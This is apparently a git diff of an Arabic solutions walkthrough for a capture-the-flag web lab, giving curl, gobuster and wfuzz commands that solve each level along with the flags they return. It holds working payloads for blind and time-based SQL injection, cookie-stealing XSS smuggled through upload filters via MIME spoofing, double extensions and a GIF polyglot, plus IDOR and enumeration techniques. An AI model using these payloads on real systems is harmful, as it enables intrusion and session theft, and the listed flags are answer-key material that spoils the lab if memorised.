@@ -37,9 +37,10 @@ curl -G "$B/product" --data-urlencode level=3 --data-urlencode "id=0/**/UnIoN/**
 curl -G "$B/api/lookup" --data-urlencode level=1 --data-urlencode "id=1 AND substr((SELECT flag FROM blind WHERE level=1),1,1)='F'"   # {"exists":true}
 # L2 يحذف and/or الصغيرة → AnD:
 curl -G "$B/api/lookup" --data-urlencode level=2 --data-urlencode "id=1 AnD substr((SELECT flag FROM blind WHERE level=2),1,1)='F'"
-# L3 زمني (الرد ثابت status:ok) → قِس الزمن:
+# L3 زمني (الرد ثابت status:ok) → قِس الزمن (لا يُرى في المتصفح، يُقاس):
+# صحيح ≈ 0.65s ، خاطئ ≈ 0.002s. لتأخير أوضح ارفع randomblob (200M ≈ 0.65s، 20M ≈ 0.07s).
 curl -o /dev/null -w '%{time_total}\n' -G "$B/api/lookup" --data-urlencode level=3 \
-  --data-urlencode "id=1 AnD (SELECT CASE WHEN substr((SELECT flag FROM blind WHERE level=3),1,1)='F' THEN length(hex(randomblob(20000000))) ELSE 0 END)"
+  --data-urlencode "id=1 AnD (SELECT CASE WHEN substr((SELECT flag FROM blind WHERE level=3),1,1)='F' THEN length(hex(randomblob(200000000))) ELSE 0 END)"
 ```
 حلقة استخراج L1 (تعطي `FLAG{0xweb_sqli_blind_l1}`):
 ```bash
@@ -77,28 +78,49 @@ L3: javascript:alert(document.cookie)                     (سِنك href → ا�
 
 ## 9) File/Dir Enumeration
 ```bash
-curl "$B/robots.txt"                                 # يكشف db.sql.bak, /admin-panel, /server-status
+# L1: robots.txt يسرّب db.sql.bak فقط
+curl "$B/robots.txt"                                 # Disallow: /static/files/db.sql.bak
 curl "$B/static/files/db.sql.bak"                    # FLAG{0xweb_enum_l1}
+# L2: dotfile غير مُسرَّب — يُكتشف بقائمة تحوي .env (common.txt، لا raft-small):
+gobuster dir -u "$B/static/files/" -w .../common.txt
 curl "$B/static/files/.env"                          # FLAG{0xweb_enum_l2}
+# L3: غير مذكور في robots — يُكتشف بالـ fuzzing + تمييز كود الحالة:
+gobuster dir -u "$B/" -w .../raft-small-directories.txt   # server-status→200 ، admin-panel→403
 curl -o /dev/null -w '%{http_code}\n' "$B/admin-panel"   # 403 (موجود) ≠ 404
-curl "$B/admin-panel?token=0xweb-internal"           # FLAG{0xweb_enum_l3}  (أو /server-status)
+curl "$B/server-status"                              # FLAG{0xweb_enum_l3}  (أو /admin-panel?token=0xweb-internal)
 ```
 
-## 10) File Upload — `/upload` (level في النموذج)
-علم يُمنح فقط عند تجاوز فحص ذلك المستوى:
+## 10) File Upload — `/upload` (الخادم يقبل "صورًا فقط")
+الهدف: تهريب ملف **ينفّذ في المتصفح** (stored XSS) خلف فلتر الصور. العلم يُمنح فقط إذا كان الملف
+المخزَّن بامتداد فعّال (`.html/.svg`) **وفيه محتوى فعّال حقيقي**. حمولة الاختبار:
+`printf '<script>alert(document.cookie)</script>' > p.html`
 ```bash
-curl -L -F level=1 -F file=@x.svg   $B/upload         # FLAG{0xweb_upload_l1}
-curl -L -F level=2 -F file=@x.SVG   $B/upload         # FLAG{0xweb_upload_l2}  (حالة الأحرف)
-# L3: svg بحشو تعليق >512 بايت قبل <svg> ثم:
-curl -L -F level=3 -F file=@padded.svg $B/upload      # FLAG{0xweb_upload_l3}
+# L1: الفلتر يثق بترويسة Content-Type فقط → زوّرها إلى image/*:
+curl -L -F level=1 -F 'file=@p.html;type=image/png'  $B/upload   # FLAG{0xweb_upload_l1}
+
+# L2: الفلتر يطلب امتداد صورة "داخل" الاسم (contains لا endswith) → امتداد مزدوج:
+cp p.html shell.png.html
+curl -L -F level=2 -F 'file=@shell.png.html'         $B/upload   # FLAG{0xweb_upload_l2}
+
+# L3: الفلتر يقرأ بايتات البداية ويطلب توقيع صورة حقيقي → polyglot صورة/سكربت:
+printf 'GIF89a<script>alert(document.cookie)</script>' > poly.html
+curl -L -F level=3 -F 'file=@poly.html'              $B/upload   # FLAG{0xweb_upload_l3}
 ```
+> افتح رابط الملف المرفوع `/static/uploads/<الاسم>` لرؤية `alert` ينفّذ (إثبات الـ stored XSS).
 
 ## 11) Parameter Enumeration — `/debug?level=`
+اكتشف الاسم أولًا (رد مختلف الطول عند الاسم الصحيح)، ثم القيمة:
 ```bash
+# اكتشاف الاسم بـ wfuzz (فلترة حجم الـ baseline بـ --hh):
+wfuzz -u "$B/debug?level=1&FUZZ=1" -w burp-parameter-names.txt --hh 15
+# أو arjun (يكشف تلقائيًا بالفروقات):  arjun -u "$B/debug?level=1"
+# الأسماء/القيم التي تفتح العلم:
 curl "$B/debug?level=1&verbose=1"                     # FLAG{0xweb_param_l1}
-curl "$B/debug?level=2&debug_token=0xweb"             # FLAG{0xweb_param_l2}
+curl "$B/debug?level=2&debug=1"                       # FLAG{0xweb_param_l2}
 curl "$B/debug?level=3&admin=true"                    # FLAG{0xweb_param_l3}
 ```
+> ملاحظة: الاسم الصحيح بقيمة خاطئة يردّ `{"status":"ok","<param>":"recognized — value rejected"}`
+> (طول مختلف → تكتشفه الأداة)، بينما المعامل المجهول يردّ `{"status":"ok"}` فقط.
 
 ## 12) Virtual Host Enumeration (ترويسة Host)
 ```bash
@@ -115,6 +137,27 @@ curl "$B/profile?user_id=3&level=1"                   # FLAG{0xweb_idor_l1}  (se
 curl "$B/api/orders?order_id=3&level=2"               # FLAG{0xweb_idor_l2}  (طلب admin بلا تحقق ملكية)
 curl "$B/api/account?ref=$(printf 3|base64)&level=3"  # FLAG{0xweb_idor_l3}  (حقل token — مرجع base64)
 ```
+
+## قوائم الكلمات المساعدة (Wordlists)
+
+التحديات القائمة على الاستطلاع تحتاج القائمة **المناسبة** — اختيارها نصف الحل. القوائم من
+[SecLists](https://github.com/danielmiessler/SecLists) (استنسخها بنفسك؛ ليست ضمن هذا الريبو).
+المسارات أدناه نسبية لجذر SecLists.
+
+| التحدي | القائمة المقترحة | لماذا / ملاحظة |
+|---|---|---|
+| **File/Dir Enum L1** | — (اقرأ `robots.txt` مباشرة) | لا تحتاج قائمة |
+| **File/Dir Enum L2** (`.env`) | `Discovery/Web-Content/common.txt` | تحوي dotfiles مثل `.env` — **قوائم `raft-small` لا تحويها** |
+| **File/Dir Enum L3** (`/server-status`,`/admin-panel`) | `Discovery/Web-Content/raft-small-directories.txt` | ميّز `200`/`403` عن `404` (`gobuster -b ''` أو `ffuf -mc all`) |
+| **Parameter Enum** (`verbose`,`debug`,`admin`) | `Discovery/Web-Content/burp-parameter-names.txt` | أو `arjun` بقائمته المدمجة؛ **افلتر حجم الـ baseline** (`wfuzz --hh`) |
+| **Virtual Host Enum** | قائمة FQDN كاملة (`dev.0xweb.local` …) | ضد IP: **لا** تستعمل `--append-domain`؛ أو `ffuf -H "Host: FUZZ.0xweb.local"` |
+| **LFI** (تحميل ملفات النظام) | `Fuzzing/LFI/LFI-Jhaddix.txt` | لاكتشاف مسارات LFI الشائعة (بعد فهم آلية التجاوز) |
+| **File Upload** | — (لا قائمة) | التقنية يدوية: MIME spoof / امتداد مزدوج / polyglot |
+
+**قواعد ذهبية:**
+- **الفلترة إلزامية:** بدون إخفاء الـ baseline (`--hh`/`-fs`/`-b`) كل الردود تبدو متطابقة فتظنّ "لا شيء".
+- **القائمة الصغيرة تفوّت الكثير:** إن فشلت `common`/`raft-small`، صعّد إلى `raft-medium`/`raft-large`.
+- **dotfiles وملفات النسخ:** أضف امتدادات (`-x env,bak,old,sql,zip`) لاكتشاف `.env`/`db.sql.bak`.
 
 ## سلّم الأعلام في /submit
 كل الأعلام صيغتها `FLAG{0xweb_<فئة>_l<1|2|3>}`. الفئات: traversal, lfi, sqli_union, sqli_blind,
